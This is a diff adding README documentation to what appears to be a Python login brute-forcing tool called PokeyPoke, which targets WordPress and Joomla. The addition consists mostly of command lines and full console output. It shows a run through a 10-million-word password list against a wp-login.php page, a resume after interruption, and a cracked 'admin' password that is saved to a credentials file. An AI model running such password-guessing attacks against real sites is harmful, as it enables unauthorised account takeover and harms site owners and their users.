@@ -106,3 +106,66 @@ Consecutive target hits are each appended to the result file, one entry per line
 https://test.us/wp-login.php:username=admin:password=dragon
 https://test1.us/wp-login.php:username=user:password=1234567
 ```
+When interrupted, the next word in queue to be processed is presented.  This can be used with the --resume flag to pick up at a specific point in the password list.
+```
+# python pokeypoke.py --word-list ../.lists/10million.txt --target https://test.us/wp-login.php -v --wp               
+[*] PokeyPoke v0.1a (Development Version)
+[*] Argument Summary
+ -  Target(s)           : https://test.us/wp-login.php
+ -  Max Threads         : 5
+ -  Word List           : ../.lists/10million.txt
+ -  Username Field      : log
+ -  Password Field      : pwd
+ -  Resume On           : None
+ -  Success String(s)   : Logged In, Welcome to your WordPress Dashboard!
+ -  Verbose             : True
+ -  No Color            : False
+ -  Username(s)         : admin
+ -  Output File         : creds.20170718-175456.txt
+ -  WordPress           : True
+ -  Joomla              : False
+ -  Seeking target: https://test.us/wp-login.php
+ -  Found 1000000 words
+ -  Trying 123456, 999999 words remain
+ -  Trying password, 999998 words remain
+ -  Trying 12345678, 999997 words remain
+ -  Trying qwerty, 999996 words remain
+ -  Trying 123456789, 999995 words remain
+ -  Trying 12345, 999994 words remain
+ -  Trying 1234, 999993 words remain
+^C -  Resume on: 111111
+[*] Completed
+
+# python pokeypoke.py --word-list ../.lists/10million.txt --target https://test.us/wp-login.php -v --wp --resume 111111
+[*] PokeyPoke v0.1a (Development Version)
+[*] Argument Summary
+ -  Target(s)           : https://test.us/wp-login.php
+ -  Max Threads         : 5
+ -  Word List           : ../.lists/10million.txt
+ -  Username Field      : log
+ -  Password Field      : pwd
+ -  Resume On           : 111111
+ -  Success String(s)   : Logged In, Welcome to your WordPress Dashboard!
+ -  Verbose             : True
+ -  No Color            : False
+ -  Username(s)         : admin
+ -  Output File         : creds.20170718-175510.txt
+ -  WordPress           : True
+ -  Joomla              : False
+ -  Seeking target: https://test.us/wp-login.php
+ -  Resuming from 111111
+ -  Found 999992 words
+ -  Trying 1234567, 999991 words remain
+ -  Trying dragon, 999990 words remain
+ -  Trying 123123, 999989 words remain
+ -  Trying baseball, 999988 words remain
+ -  Trying abc123, 999987 words remain
+ -  Trying football, 999986 words remain
+ -  Trying monkey, 999985 words remain
+ -  Trying letmein, 999984 words remain
+ -  Trying 696969, 999983 words remain
+ -  Logged in: Welcome to your WordPress Dashboard!
+[!] Target: https://test.us/wp-login.php :: Password for admin: dragon
+ -  Writing output to creds.20170718-175510.txt
+[*] Completed
+```
